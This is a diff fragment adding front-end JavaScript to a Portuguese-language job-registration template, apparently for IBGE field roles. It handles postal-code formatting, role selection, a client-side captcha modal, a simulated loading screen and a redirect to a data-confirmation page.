+                    <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
+                    <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
+                </svg>
+                ${mensagem}
+            </div>
+        `;
+    } else if (tipo === 'sucesso') {
+        resultadoDiv.className = 'mt-4 p-4 rounded-lg bg-green-50 border border-green-200 text-green-700';
+        resultadoDiv.innerHTML = mensagem;
+    } else {
+        resultadoDiv.className = 'mt-4 p-4 rounded-lg bg-red-50 border border-red-200 text-red-700';
+        resultadoDiv.innerHTML = mensagem;
+    }
+    
+    resultadoDiv.classList.remove('hidden');
+}
+
+function formatarCEP(cep) {
+    return cep.replace(/(\d{5})(\d{3})/, '$1-$2');
+}
+
+function verificarFormulario() {
+    const botaoProsseguir = document.getElementById('btn-prosseguir');
+    
+    console.log('Verificando formulário:', {
+        cargoSelecionado,
+        cepVerificado,
+        termosAceitos
+    });
+    
+    // Botão sempre habilitado
+    if (botaoProsseguir) {
+        botaoProsseguir.disabled = false;
+        botaoProsseguir.classList.remove('opacity-50', 'cursor-not-allowed');
+        botaoProsseguir.classList.add('hover:bg-blue-700');
+    }
+}
+
+function confirmarEndereco() {
+    const checkbox = document.getElementById('endereco-correto');
+    const btnProsseguir = document.getElementById('btn-prosseguir');
+    
+    if (checkbox && btnProsseguir) {
+        if (checkbox.checked) {
+            btnProsseguir.disabled = false;
+            btnProsseguir.className = 'bg-[#0B2341] text-white px-12 py-4 rounded font-semibold hover:bg-[#071d41] transition-colors cursor-pointer text-lg';
+            console.log('Botão ativado - endereço confirmado!');
+        } else {
+            btnProsseguir.disabled = true;
+            btnProsseguir.className = 'bg-gray-400 text-white px-12 py-4 rounded font-semibold cursor-not-allowed transition-colors text-lg';
+            console.log('Botão desativado');
+        }
+    }
+}
+
+function prosseguirInscricao() {
+    // Capturar dados do formulário
+    const cepInput = document.getElementById('cep');
+    const cep = cepInput ? cepInput.value.replace(/\D/g, '') : '01310100';
+    
+    // Capturar cargo selecionado
+    const cargoRadio = document.querySelector('input[name="cargo"]:checked');
+    const cargo = cargoRadio ? cargoRadio.value : '';
+    
+    // Capturar categoria CNH se aplicável
+    let categoriaCnh = '';
+    if (cargo === 'supervisor') {
+        const cnhRadio = document.querySelector('input[name="categoria_cnh"]:checked');
+        categoriaCnh = cnhRadio ? cnhRadio.value : '';
+    }
+    
+    // Salvar CEP no localStorage para uso posterior
+    localStorage.setItem('ibge_cep_selecionado', cep);
+    localStorage.setItem('ibge_cargo_selecionado', cargo);
+    
+    console.log('CEP capturado:', cep);
+    console.log('Cargo selecionado:', cargo);
+    console.log('Redirecionando para:', `/confirmacao-dados?cep=${cep}&cargo=${cargo}&categoria_cnh=${categoriaCnh}`);
+    
+    // Mostrar indicador de carregamento durante transição
+    const btnProsseguir = document.getElementById('btn-prosseguir');
+    if (btnProsseguir) {
+        btnProsseguir.innerHTML = '<i class="fas fa-spinner fa-spin mr-2"></i>Carregando...';
+        btnProsseguir.disabled = true;
+    }
+    
+    // Redirecionar para confirmação de dados
+    window.location.href = `/confirmacao-dados?cep=${cep}&cargo=${cargo}&categoria_cnh=${categoriaCnh}`;
+}
+
+function continuarInscricao() {
+    const captchaVerificado = localStorage.getItem('captchaVerificado') === 'true';
+    
+    if (cargoSelecionado && cepVerificado && termosAceitos && captchaVerificado) {
+        // Salvar dados no localStorage
+        localStorage.setItem('cargoSelecionado', cargoSelecionado);
+        localStorage.setItem('cepVerificado', document.getElementById('cep').value);
+        localStorage.setItem('termosAceitos', 'true');
+        
+        // Redirecionar para próxima etapa
+        window.location.href = '/formulario-inscricao';
+    }
+}
+
+// Função para gerar código captcha
+function generateCaptcha() {
+    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
+    let result = '';
+    for (let i = 0; i < 6; i++) {
+        result += chars.charAt(Math.floor(Math.random() * chars.length));
+    }
+    currentCaptcha = result;
+    document.getElementById('captcha-text').textContent = result;
+}
+
+// Função para mostrar modal de captcha
+function showCaptchaModal() {
+    generateCaptcha();
+    document.getElementById('captcha-modal').classList.remove('hidden');
+    document.body.style.overflow = 'hidden';
+    // Removido focus automático para evitar problema no mobile
+}
+
+// Funções para controlar a tela de carregamento
+function showLoadingScreen() {
+    document.getElementById('loading-screen').classList.remove('hidden');
+    document.body.style.overflow = 'hidden';
+}
+
+function hideLoadingScreen() {
+    document.getElementById('loading-screen').classList.add('hidden');
+    document.body.style.overflow = 'auto';
+}
+
+// Função para confirmar endereço
+function confirmarEndereco() {
+    const enderecoCorreto = document.getElementById('endereco-correto');
+    if (enderecoCorreto && enderecoCorreto.checked) {
+        cepVerificado = true;
+    } else {
+        cepVerificado = false;
+    }
+    verificarFormulario();
+}
+
+// Event listeners
+document.addEventListener('DOMContentLoaded', function() {
+    // CEP input formatting
+    const cepInput = document.getElementById('cep');
+    cepInput.addEventListener('input', function(e) {
+        let value = e.target.value.replace(/\D/g, '');
+        value = value.replace(/(\d{5})(\d{3})/, '$1-$2');
+        e.target.value = value;
+        
+        // Reset verification when CEP changes
+        cepVerificado = false;
+        document.getElementById('resultado-cep').classList.add('hidden');
+        verificarFormulario();
+    });
+    
+    // Terms checkbox - mostrar modal anti-bot quando aceitar termos
+    document.getElementById('aceito-termos').addEventListener('change', function(e) {
+        if (e.target.checked) {
+            // Mostrar modal anti-bot imediatamente quando aceitar termos
+            showCaptchaModal();
+        }
+        verificarFormulario();
+    });
+    
+    // Event listeners para seleção de cargo
+    document.getElementById('cargo-agente').addEventListener('change', function(e) {
+        if (e.target.checked) {
+            selecionarCargo('agente');
+        }
+    });
+    
+    document.getElementById('cargo-supervisor').addEventListener('change', function(e) {
+        if (e.target.checked) {
+            selecionarCargo('supervisor');
+        }
+    });
+    
+    document.getElementById('cargo-supervisor').addEventListener('change', function(e) {
+        if (e.target.checked) {
+            selecionarCargo('supervisor');
+        }
+    });
+    
+    // Event listener para checkbox "Meu endereço está correto"
+    const enderecoCheckbox = document.getElementById('endereco-confirmado');
+    if (enderecoCheckbox) {
+        enderecoCheckbox.addEventListener('change', function(e) {
+            console.log('Endereço confirmado:', e.target.checked);
+            verificarFormulario();
+        });
+    }
+    
+    // Event listener global para checkbox criado dinamicamente
+    document.addEventListener('change', function(e) {
+        if (e.target && e.target.id === 'endereco-correto') {
+            console.log('Checkbox alterado:', e.target.checked);
+            confirmarEndereco();
+        }
+    });
+
+    // Language selector
+    const languageSelector = document.getElementById('language-selector');
+    const languageDropdown = document.getElementById('language-dropdown');
+    const languageChevron = document.getElementById('language-chevron');
+
+    if (languageSelector && languageDropdown) {
+        languageSelector.addEventListener('click', function(e) {
+            e.preventDefault();
+            languageDropdown.classList.toggle('hidden');
+            languageChevron.classList.toggle('rotate-180');
+        });
+
+        document.addEventListener('click', function(e) {
+            if (!languageSelector.contains(e.target)) {
+                languageDropdown.classList.add('hidden');
+                languageChevron.classList.remove('rotate-180');
+            }
+        });
+    }
+
+    // Sidebar menu functionality
+    const menuToggle = document.getElementById('menu-toggle');
+    const menuClose = document.getElementById('menu-close');
+    const sidebarMenu = document.getElementById('sidebar-menu');
+    const menuOverlay = document.getElementById('menu-overlay');
+
+    function openMenu() {
+        sidebarMenu.classList.remove('-translate-x-full');
+        menuOverlay.classList.remove('hidden');
+        document.body.style.overflow = 'hidden';
+    }
+
+    function closeMenu() {
+        sidebarMenu.classList.add('-translate-x-full');
+        menuOverlay.classList.add('hidden');
+        document.body.style.overflow = '';
+    }
+
+    if (menuToggle) {
+        menuToggle.addEventListener('click', openMenu);
+    }
+
+    if (menuClose) {
+        menuClose.addEventListener('click', closeMenu);
+    }
+
+    if (menuOverlay) {
+        menuOverlay.addEventListener('click', closeMenu);
+    }
+
+    // Search functionality
+    const searchToggle = document.getElementById('search-toggle');
+    const searchBox = document.getElementById('search-box');
+
+    if (searchToggle && searchBox) {
+        searchToggle.addEventListener('click', function(e) {
+            e.preventDefault();
+            searchBox.classList.toggle('hidden');
+            if (!searchBox.classList.contains('hidden')) {
+                document.getElementById('search-input').focus();
+            }
+        });
+
+        document.addEventListener('click', function(e) {
+            if (!searchToggle.contains(e.target) && !searchBox.contains(e.target)) {
+                searchBox.classList.add('hidden');
+            }
+        });
+    }
+
+    // Event listeners para o modal de captcha
+    const captchaModal = document.getElementById('captcha-modal');
+    const captchaInput = document.getElementById('captcha-input');
+    const refreshCaptcha = document.getElementById('refresh-captcha');
+    const verifyCaptcha = document.getElementById('verify-captcha');
+    const fecharCaptcha = document.getElementById('fechar-captcha');
+    const captchaError = document.getElementById('captcha-error');
+
+    // Gerar novo código
+    if (refreshCaptcha) {
+        refreshCaptcha.addEventListener('click', function() {
+            generateCaptcha();
+            captchaInput.value = '';
+            captchaError.classList.add('hidden');
+        });
+    }
+
+    // Verificar código
+    if (verifyCaptcha) {
+        verifyCaptcha.addEventListener('click', function() {
+            const userInput = captchaInput.value.toUpperCase();
+            const error = document.getElementById('captcha-error');
+            
+            if (userInput === currentCaptcha) {
+                // Código correto - iniciar carregamento
+                showLoadingScreen();
+                
+                // Simular processo de validação (5 segundos)
+                setTimeout(() => {
+                    // Fechar modal do captcha
+                    captchaModal.classList.add('hidden');
+                    
+                    // Esconder tela de carregamento
+                    hideLoadingScreen();
+                    
+                    // Marcar que passou no captcha
+                    localStorage.setItem('captchaVerificado', 'true');
+                    
+                    // Tornar campo de termos verde
+                    const termosLabel = document.querySelector('label[for="aceito-termos"]');
+                    if (termosLabel) {
+                        termosLabel.classList.add('bg-green-100', 'border-green-300');
+                        termosLabel.classList.remove('hover:bg-gray-50');
+                        termosLabel.style.borderWidth = '2px';
+                        termosLabel.style.borderStyle = 'solid';
+                    }
+                    
+                    // Verificar se pode habilitar botão prosseguir
+                    verificarFormulario();
+                    
+                }, 5000);
+                
+            } else {
+                // Código incorreto
+                error.classList.remove('hidden');
+                generateCaptcha();
+                captchaInput.value = '';
+            }
+        });
+    }
+
+    // Fechar modal
+    if (fecharCaptcha) {
+        fecharCaptcha.addEventListener('click', function() {
+            captchaModal.classList.add('hidden');
+            document.body.style.overflow = 'auto';
+        });
+    }
+
+    // Enter para verificar
+    if (captchaInput) {
+        captchaInput.addEventListener('keypress', function(e) {
+            if (e.key === 'Enter') {
+                verifyCaptcha.click();
+            }
+        });
+        
+        // Converter para maiúscula automaticamente
+        captchaInput.addEventListener('input', function(e) {
+            e.target.value = e.target.value.toUpperCase();
+            document.getElementById('captcha-error').classList.add('hidden');
+        });
+    }
+});
+</script>
+{% endblock %}
